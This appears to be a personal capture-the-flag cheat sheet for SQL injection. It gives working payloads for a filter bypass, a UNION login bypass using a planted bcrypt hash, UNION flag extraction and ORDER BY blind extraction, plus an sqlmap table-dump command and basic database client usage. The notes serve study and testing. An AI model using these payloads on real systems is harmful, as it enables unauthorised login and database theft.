# SQL

### SQLi Payloads


#### Technique 1
> Bypassing a custom Key filter code (PHP MySQL)

```bash
UPDATE EMPLOYEE SET role/**/='Admin' where name='John';   
# To bypass if (strtolower($key) === 'role') check in PHP

GET /save_game.php?clicks=5&level=1&role/**/='Admin' HTTP/1.1   
# Did not work bcoz of '' around Admin

GET /save_game.php?clicks=5&level=2&role/**/=Admin HTTP/1.1	
# Worked
```


#### Technique 2

> Custom Hash Return for Authentication bypass:
> - Use a non-existent username
> - Use "Union" to return the custom Hash (Bcrypt in our case)
> - Input the corresponding initial text of the Hash for the password field  
>
> pwd:$2y$10$P2yVASiQI.QXgOScCbbN5urTz1IN.wXbuh.xlB9DesLZs0jlxEBj2

```
username=askhdajhdajs'+union+select+'$2y$10$P2yVASiQI.QXgOScCbbN5urTz1IN.wXbuh.xlB9DesLZs0jlxEBj2&password=pwd
```

#### Technique 3 
> "Union" Technique to augment the contents of the "flag" table to the current result set
>
> **Important Learning** : Using ''='' instead of '1'='1' to reduce payload size for queries involving quotes and length restrictions
>
> *Flask & SQLite*

```py
# Basic Checks & User Input Sanitization were present

if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")

# The query part

    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r


# The payload

name=Finn+Carson&guests=No+guests+at+all&neatness=Clean+up+once+per+week&sleep=8-10pm&awake=6-8am&'1'=1'UNION%20SELECT%201,flag,1,1,1,1%20FROM%20flag%20WHERE%20''='
```


#### Technique 4 
> **"ORDER BY"** Blind SQLi
>
> *SQLite Payload*

```python
# Payload for extracting a table name containing random chars

r = reqests.post(
    url + "api/list",
    data={
        "order": f"(CASE WHEN (SELECT SUBSTR(name, {position},1) FROM sqlite_master WHERE type='table' AND name LIKE 'flag%')='{character}' THEN count ELSE id END) DESC"
    }
)

# {position} and {character} are variables that are to changed in every iteration to leak out chars.

# If the charcter returned by SUBSTR is EQUAL to the character in the character variable then the results are ordered by count in desc order otherwise by id in desc order. 



# Payload for extracting a column's value (the flag)

r = reqests.post(
    url + "api/list",
    data={
        "order": f"(CASE WHEN (SELECT SUBSTR(flag, {position},1) FROM flag_82f881e7)='{character}' THEN count ELSE id END) DESC"
    }
)

```

---

### SQLMap

```bash
sqlmap -u "https://nagios.<REDACTED>.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=32f2<REDACTED>ab" --batch --level 5 --risk 3 -T xi_users --columns --dump
```

- `id` parameter was injectable according to the report. So pressed `CTRL+C` and typed `n` to start testing the next parameter in the query string which happened to be the `id` paramter.
- `--batch` for never asking for user input & using the default behavior
- `--level` for level of tests to perform (1-5, default 1)
- `--risk` for risk of tests to perform (1-3, default 1)
- `-T` for specifying the DBMS database table(s) to enumerate
- `--columns` for enumerating DBMS database table columns.
- `--dump` for dumping DBMS database table entries


```bash
sqlmap -r req.txt --dump
```

- `-r` uses the intercepted request you saved earlier
- `--dump` attempts to outputs the entire database

---

### Sqlite3

```bash
sqlite3 your_database.db
```

Varrious commands:

```sql
.tables
.schema table_name
SELECT * FROM your_table;
.exit
```

---

### MySQL

```bash
mysql -u lewis -D joomla -p
```
- `-u` for username and `-D` for database.
- `-p` for Password. If password is not given it's asked from the tty.
- `-P` for Port

```
show tables;
select * from sd4fg_users;
exit;
```

---

### psql (for PostgreSQL)

```bash
psql -h 127.0.0.1 -U Username
```
- `-h` for hostname
- `-p` for port
- `-w` for no password
- `-W` for password


```
\c <database>
\d // to list tables PRESS q to escape
\q // to escape psql
```
